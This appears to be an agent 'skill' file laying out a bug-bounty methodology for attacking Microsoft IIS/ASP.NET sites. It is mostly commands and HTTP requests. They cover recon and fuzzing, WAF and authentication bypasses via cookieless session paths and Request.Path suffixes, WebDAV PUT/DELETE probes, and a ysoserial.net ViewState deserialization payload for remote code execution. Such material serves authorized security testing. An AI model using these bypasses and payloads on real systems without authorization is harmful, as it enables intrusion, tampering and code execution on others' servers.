---
name: "iis-hacking"
version: "2.0"
category: "pwn"
subcategory: "iis"
phase: "exploitation"
tags: ["bug-bounty", "pwn", "iis", "asp.net", "windows", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["ffuf", "httpx-toolkit", "nuclei", "subfinder", "ysoserial.net", "shortscan", "dotPeek", "arjun", "authz", "autorize", "burp", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["exploitation-chaining", "bug-bounty-reporting"]
description: "Bug bounty skill: iis hacking - exploitation phase, pwn category"
---
# Microsoft IIS Hacking

## Summary

A structured methodology for identifying IIS exposure, misconfigurations, and potential weaknesses — from recon and shortname enumeration to targeted fuzzing, WebDAV abuse, ViewState deserialization, and ASP.NET authentication bypasses.

## Key Concepts

- **IIS Short Name (8.3) Enumeration**: IIS generates 8.3 short filenames for long file/directory names. These can be enumerated via tilde (`~`) requests to discover hidden files and directories.
- **ASP.NET Cookieless Sessions**: Session ID can be injected into the URL as `(S(...))`, which IIS strips before routing — can bypass WAF rules.
- **Request.Path Manipulation**: Appending `/Login.aspx` to a protected path like `/Admin/ManageUsers.aspx/Login.aspx` can bypass auth checks if the app uses weak `Request.Path` comparison.
- **ViewState**: Serialized page state stored in a hidden `__VIEWSTATE` field — if MAC/MachineKey is weak, can lead to deserialization RCE.

## Technical Details

### Phase 1: Reconnaissance (Dorking)

**Google Dorks**
```
intitle:"IIS Windows Server" site:*.target.com
intext:"IIS Windows Server" site:*.target.com
```

**Shodan Dorks**
```
http.title:"IIS"
org:"target" http.title:"IIS Windows Server"
hostname:".target.com" "Microsoft-IIS/6.0"
product:"Microsoft IIS httpd" version:"7.5"
```

**FOFA Dorks**
```
body="iis-8.5"
server="Microsoft-IIS"
server="Microsoft-IIS/8.5"
```

**Hunter.how Dorks**
```
web.title="IIS Windows Server" and domain="target.com"
header.server=="Microsoft-IIS/10" and domain="target.com"
```

**Confirming IIS**
```bash
curl -I https://target.com
# Look for: Server: Microsoft-IIS/10.0, X-Powered-By: ASP.NET

nmap -p 80,443 -sV -sC target.com
```

### Phase 2: Subdomain Enumeration & IIS Detection

```bash
# Passive
subfinder -d example.com -all -silent -o subfinder.txt
assetfinder --subs-only example.com > assetfinder.txt
amass enum -passive -d example.com -o amass_passive.txt
findomain -t example.com -u findomain.txt
chaos -d example.com > chaos.txt
waybackurls example.com | unfurl -u domains > wayback.txt

# Active
amass enum -active -d example.com -o amass_active.txt
dnsx -d example.com -resp -o dnsx.txt
puredns bruteforce wordlist.txt example.com -o puredns.txt

# Combine
cat *.txt | sort -u > all_subdomains.txt

# Probe and filter IIS
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server | grep IIS
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server | grep -i "IIS/7.5"
```

**Nuclei scanning**
```bash
cat all_subdomains.txt | nuclei -t /nuclei-templates/http/misconfiguration/iis-shortname-detect.yaml
cat all_subdomains.txt | nuclei -tags iis
cat all_subdomains.txt | nuclei -tags cve
```

### Phase 3: Short Name (8.3) Enumeration

**Method A — Burp Suite IIS Short Name Scanner extension**

**Method B — Shortscan (bitquark)**
```bash
shortscan http://target.com/
shortscan http://target.com/ -F
shortscan @targets.txt -F
shortscan http://target.com/admin
shortscan http://target.com/admin/
```

### Phase 4: Precision Fuzzing with FFUF

```bash
# Basic fuzzing with IIS wordlist
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w iis.txt

# With high-value extensions
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w iis.txt \
  -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar

# Fuzz specific extension
ffuf -u "https://target.com/FUZZ.rar" -c -ac -fs 0 -w iis.txt

# Resolve shortname to full name
ffuf -u "https://target.com/MEDIVESTFUZZ" -c -ac -fs 0 -w iis.txt -e .exe,.dll,.rar -fc 403

# Fuzz discovered directory further
ffuf -u "https://target.com/FTP-Contacts/FUZZ" -c -ac -fs 0 -w iis.txt \
  -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar -fc 403
```

**Smart Variation-Based Fuzzing**
```bash
# Prefix variations
ffuf -w iis.txt -u https://example.com/domainFUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/prodFUZZ ...
ffuf -w iis.txt -u https://example.com/devFUZZ ...
ffuf -w iis.txt -u https://example.com/apiFUZZ ...
ffuf -w iis.txt -u https://example.com/adminFUZZ ...

# Suffix variations
ffuf -w iis.txt -u https://example.com/FUZZdomain ...
ffuf -w iis.txt -u https://example.com/FUZZprod ...

# Hyphen/underscore/version variations
ffuf -w iis.txt -u https://example.com/FUZZ-domain ...
ffuf -w iis.txt -u https://example.com/domain_FUZZ ...
ffuf -w iis.txt -u https://example.com/FUZZv1 ...
```

### High-Value Extensions

`.json .js .svc .html .htm .txt .zip .asmx .aspx .7z .ashx .asp .xml .exe .dll .gz .xsl .bak .old .rar`

### IIS Version-Specific Weaknesses

| Version | Risks |
|---------|-------|
| **IIS 6.0** (2003) | WebDAV default ON, PUT uploads, Classic ASP, weak request filtering, shortname, weak TLS, exposed ISAPI |
| **IIS 7.0/7.5** (2008) | Shortname, WebDAV, request filtering bypass, ViewState misconfig, TRACE enabled, weak MachineKey |
| **IIS 8.0/8.5** (2012) | Shortname, weak upload validation, misconfigured WebDAV, outdated ASP.NET, TLS misconfig, verbose errors |
| **IIS 10.0** (2016+) | More secure by default; issues from misconfig: debug endpoints (trace.axd), insecure upload, weak access controls, Azure App Service misconfigs, outdated .NET apps |

### Phase 6: GitHub Path Correlation

Search GitHub for discovered shortname paths to find repos with similar structure:
```
path:/LINKON
```

### Phase 7: DLL Analysis with dotPeek

Analyze exposed `.dll` files with JetBrains dotPeek. Look for:
- Hardcoded paths and internal URLs
- Hidden API endpoints
- API keys, tokens, secrets
- Database connection strings
- Feature flags, debug code, test routes
- Backup file references

### Phase 8: Debug Endpoint Exposure

Check for ASP.NET diagnostic endpoints:
```
https://target.com/Trace.axd
```
Leaks request logs, internal paths, params, cookies.

### Phase 9: web.config Misconfiguration

On IIS 7.5 + ASP.NET, insecure uploads or improper handler mappings allowing `web.config` modification can lead to RCE.

### Phase 10: 403 Bypass Testing

Tool: [4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3)

### Phase 11: ASP.NET_SessionId Unauthorized Access

If the app only checks session presence instead of ownership/permissions:
```
GET /admin/dashboard.aspx HTTP/1.1
Cookie: ASP.NET_SessionId=VALID_OR_MANIPULATED_SESSION
```
May bypass auth checks.

### Phase 12: Bypassing WAFs with Cookieless Sessions

ASP.NET cookieless session format: `(S(ABC123XYZ))`

Normal (blocked by WAF):
```
GET /AdminPanel.aspx HTTP/1.1
```
WAF bypass:
```
GET /(S(ABC123XYZ))/AdminPanel.aspx HTTP/1.1
```
WAF sees a different path, IIS strips the session segment and routes to `/AdminPanel.aspx`.

### Phase 13: Breaking Auth via Request.Path Manipulation

If app uses weak `Request.Path` comparison:
```
# Blocked
GET /Admin/ManageUsers.aspx HTTP/1.1

# Bypass
GET /Admin/ManageUsers.aspx/Login.aspx HTTP/1.1
```

### Phase 14: WebDAV Misconfiguration

```bash
curl -X OPTIONS https://target.com -i

# If DAV: 1,2 and PUT/PROPFIND/DELETE/MOVE are allowed:
curl -X PUT https://target.com/test.txt --data "test"
curl -X DELETE https://target.com/test.txt
curl -X MOVE https://target.com/test.txt
curl -X PROPFIND https://target.com/
```

### Phase 15: ViewState Security Testing

ViewState in page source:
```html
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />
```

Decode for inspection:
```bash
echo "BASE64_ENCODED_DATA" | base64 -d
```

Generate ViewState deserialization payload (ysoserial.net):
```bash
ysoserial.net -p ViewState -g TextFormattingRunProperties -c "whoami"
```

Exploit:
```bash
curl -X POST https://target.com/login.aspx \
  -d "__VIEWSTATE=GENERATED_PAYLOAD&username=test&password=test"
```

## Methodology

1. **Recon**: Dork (Google, Shodan, FOFA, Hunter) -> Confirm IIS (headers, nmap, Wappalyzer).
2. **Subdomain Enum**: Passive + active subdomain discovery -> httpx probe -> filter by IIS version.
3. **Nuclei Scan**: Run IIS-specific templates and CVE checks.
4. **Shortname Enum**: Use Shortscan or Burp extension to enumerate 8.3 filenames.
5. **Targeted Fuzzing**: FFUF with IIS wordlists + high-value extensions, smart variations (prefix/suffix/hyphen/version).
6. **GitHub Correlation**: Search discovered shortname paths on GitHub.
7. **DLL Analysis**: Decompile exposed `.dll` files with dotPeek.
8. **Debug Endpoints**: Check for trace.axd and other diagnostic pages.
9. **Auth Bypasses**: Test cookieless session WAF bypass, Request.Path manipulation, ASP.NET_SessionId abuse.
10. **WebDAV Testing**: Check OPTIONS, test PUT/DELETE/MOVE methods.
11. **ViewState Analysis**: Decode ViewState, test deserialization with ysoserial.net if MAC is weak.
12. **403 Bypass**: Use 4-ZERO-3 tool for header/path manipulation bypass.

## Payloads

```
# Cookieless session WAF bypass
GET /(S(ABC123XYZ))/AdminPanel.aspx HTTP/1.1

# Request.Path auth bypass
GET /Admin/ManageUsers.aspx/Login.aspx HTTP/1.1

# ViewState deserialization (generated with ysoserial.net)
__VIEWSTATE=GENERATED_PAYLOAD&username=test&password=test
```

## Commands

```bash
# Confirm IIS
curl -I https://target.com
nmap -p 80,443 -sV -sC target.com
nmap -p 80,443 --script http-iis-short-name-brute target.com

# Shortname enumeration
shortscan http://target.com/
shortscan http://target.com/admin/

# Fuzzing
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w iis.txt -e .aspx,.asmx,.config,.bak,.rar,.zip

# WebDAV
curl -X OPTIONS https://target.com -i
curl -X PUT https://target.com/test.txt --data "test"

# ViewState decode
echo "BASE64" | base64 -d

# ViewState exploit (ysoserial.net)
ysoserial.net -p ViewState -g TextFormattingRunProperties -c "whoami"

# Probe IIS hosts
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server | grep IIS

# Nuclei
cat all_subdomains.txt | nuclei -tags iis
cat all_subdomains.txt | nuclei -tags cve
```

## Tools

- **Shortscan** — IIS short name enumeration (bitquark)
- **FFUF** — Web fuzzing
- **httpx-toolkit** — HTTP probing with tech detection
- **Nuclei** — Template-based vulnerability scanning
- **Subfinder / Assetfinder / Amass / Findomain** — Subdomain discovery
- **GAU / Waybackurls** — Historical URL collection
- **dotPeek** — .NET decompiler (JetBrains)
- **ysoserial.net** — ViewState deserialization payload generator
- **4-ZERO-3** — 403 bypass automation
- **Wappalyzer** — Browser extension for tech detection

## Bypass Techniques

- **ASP.NET Cookieless Session WAF Bypass**: `/(S(ABC))/AdminPanel.aspx` — WAF sees different path, IIS strips session.
- **Request.Path Auth Bypass**: `/Admin/ManageUsers.aspx/Login.aspx` — app sees `/Login.aspx` in path, skips admin auth.
- **ASP.NET_SessionId Abuse**: App checks only session presence, not ownership/permissions.
- **403 Bypass**: Use 4-ZERO-3 tool for header/path manipulation.
- **API Version Downgrade**: Test older API versions (v1) when newer ones exist (v2/v3).

## Notes

- Shortname enumeration is one of the most reliable IIS-specific techniques for discovering hidden files and directories.
- WAF bypass via cookieless sessions is specific to ASP.NET and very effective against WAFs that don't normalize paths the same way IIS does.
- Always verify the version — each IIS version has different default weaknesses.
- Exposed `.dll` files can reveal the full application structure through decompilation.
- ViewState deserialization requires a known or guessable MachineKey — check common/default keys.
- trace.axd is a goldmine for recon if left enabled in production.

## References

- https://infosecwriteups.com/hacking-microsoft-iis-from-recon-to-advanced-fuzzing-013989524fe2
- https://github.com/bitquark/shortscan
- https://github.com/Dheerajmadhukar/4-ZERO-3
- https://github.com/puckiestyle/ysoserial.net
- https://www.jetbrains.com/decompiler/
